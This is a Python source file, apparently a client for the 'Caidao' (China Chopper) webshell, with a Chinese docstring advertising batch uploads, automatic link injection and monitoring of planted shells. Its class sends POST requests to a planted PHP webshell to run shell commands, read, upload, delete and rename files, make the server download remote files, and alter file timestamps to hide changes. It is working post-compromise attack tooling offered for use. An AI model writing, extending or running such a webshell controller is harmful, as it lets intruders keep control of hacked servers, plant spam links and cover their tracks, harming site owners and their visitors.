#!/usr/bin/env python
# -*- coding: UTF-8 -*-

# Authors: img
# Date: 2018-05-25

__author__ = "img"
__date__ = '2018/5/25'

import re
from collections import namedtuple
from typing import NoReturn

import requests

from model.cache import cache
from . import PHP, encode, util

common_headers = {"Content-Type": "application/x-www-form-urlencoded"}

class Caidao():
    """
    本类是webshell操作的核心，这里负责一切webshell操作，例如批量上传等等
    功能如下：
    1 批量上传功能
    2 自动挂链功能
    3 执行命令
    5 定时监测webshell存活
    还有部分功能未完成
    """

    def __init__(self, url, password):
        self.url = url
        self.password = password
        self.types = PHP
        self.is_urlencode = self.types.is_urlencode
        self.pattern = re.compile("%s(.+)%s" % (self.types.LeftDelimiter, self.types.RightDelimiter), re.DOTALL)
        self.__initialize()

    def __initialize(self):
        self.__get_base_info()
        if self.is_linux:
            self.path = r"/bin/sh"
            self.separator = r"/"
        else:
            self.path = r"c:\\Windows\\System32\\cmd.exe"
            self.separator = "\\"

    def test_php_connection(self) -> bool:
        pass

    def test_asp_connection(self):
        pass

    def test_connection(self) -> object:
        if self.types == 'PHP':
            return self.test_php_connection()
        elif self.types == "ASP":
            return self.test_asp_connection()
        else:
            raise TypeError("could't found type, try again")

    # @util.try_except(errors=AttributeError)
    def __submit_data(self, data) -> str:
        # data = util.dictToQuery(data) if not self.is_urlencode else urlencode(data)
        with requests.post(self.url, data=data, timeout=20) as response:
            if ">>>ERROR:// Path Not Found Or No Permission!" in response.text:
                raise TypeError
            re_result = self.pattern.search(response.text)
        return re_result.group(1).strip()

    def find_writeable_folder(self):
        pass

    # @util.try_except()
    def assemble_data(self, statement, func=lambda x: x, **kwargs) -> dict:
        data = func(getattr(self.types, statement))
        base = getattr(self.types, "BASE")
        encoding = getattr(encode, PHP.encoding)
        parameter = "aaa"
        result = {
            self.password: base % ("$_POST[%s]" % parameter),
            parameter: encoding(data)
        }
        kwargs_copy = kwargs.copy()
        return {**result, **kwargs_copy}

    def exec_command(self, cmd) -> str:
        data = self.assemble_data("SHELL", lambda x: x % (self.path, cmd))
        return self.__submit_data(data)

    # @util.try_except()
    def __get_base_info(self) -> NoReturn:
        data = self.assemble_data("BASE_INFO")
        result = self.__submit_data(data)
        tuple_result = result.split('\t')
        self.current_folder = tuple_result[0]
        self.info = tuple_result[2]
        self.is_linux = True

    # @util.try_except()
    @cache()
    def get_folder_list(self, folder, flush=False) -> list:
        item = namedtuple('item', ("is_dir", 'name', "st_mtime", "size", 'permission'))
        data = self.__submit_data(self.assemble_data("SHOW_FOLDER", lambda x: x % folder))
        folder_list = []
        for i in data.split('\n'):
            try:
                folder_list.append(item._make(i.split('\t')))
            except TypeError:
                pass
        return folder_list

    # @util.try_except(errors=TypeError)
    def read_file(self, item: str) -> str:
        data = self.assemble_data("READ_FILE", lambda x: x % item)
        return self.__submit_data(data)

    def save_file(self, filename, content) -> str:
        content = util.gnucompress(content.encode())
        result = self.__submit_data(self.assemble_data("UPLOAD_FILE", lambda x: x % filename, file=content))
        if result is "1":
            return True
        else:
            raise TypeError

    def new_file(self, filename) -> bool:
        content = ""
        content = util.gnucompress(content.encode())
        result = self.__submit_data(self.assemble_data("UPLOAD_FILE", lambda x: x % filename, file=content))
        if result is "1":
            return True
        else:
            raise TypeError

    # @util.try_except()
    def upload_file(self, remote_file, local_file) -> bool:
        '''
        :param remote_file: 上传文件名，不需要绝对路径啦
        :param local_file:
        :return:
        '''
        if self.separator not in remote_file:
            folder = self.current_folder + self.separator + remote_file
        else:
            folder = remote_file
        with open(local_file, "rb") as f:
            content = util.gnucompress(f.read())
        result = self.__submit_data(self.assemble_data("UPLOAD_FILE", lambda x: x % folder, file=content))
        if result is "1":
            return True
        else:
            raise TypeError

    def wget_file_from_web(self, url, remote_path) -> bool:
        # TODO url and remote_path must be verifed before download from url to remote_path
        result = self.__submit_data(self.assemble_data("WGET_FILE", lambda x: x % (url, remote_path)))
        return True if result is "1" else False

    @util.try_except()
    def download_file_from_shell(self, remote_file) -> bool:
        # TODO implement download file function.give a remote files and download to local.return true if successed,else return false
        pass

    def rename(self, src, dst):
        # TODO src and dst must be verifed before used
        result = self.__submit_data(self.assemble_data("RENAME", lambda x: x % (src, dst)))
        return True if result is "1" else False

    def delete_file(self, remote_path) -> bool:
        result = self.__submit_data(self.assemble_data("DELETE", lambda x: x % remote_path))
        if result is "1":
            return True
        else:
            raise TypeError

    @util.try_except()
    def new_folder(self, folder_name) -> bool:
        result = self.__submit_data(self.assemble_data("NEW_FOLDER", lambda x: x % folder_name))
        if result is "1":
            return True
        else:
            raise TypeError

    @util.try_except()
    def set_time(self, remote_file, time) -> bool:
        # TODO verifed
        result = self.__submit_data(self.assemble_data("SET_TIME", lambda x: x % (remote_file, time
                                                                                  )))
        return True if result is "1" else False

    def raw(self, data: str) -> str:
        return self.__submit_data(self.assemble_data("RAW", lambda x: x % data))


if __name__ == '__main__':
    a = Caidao("http://localhost:32769/1.php", "cmd")
    print(a.get_folder_list(a.current_folder))
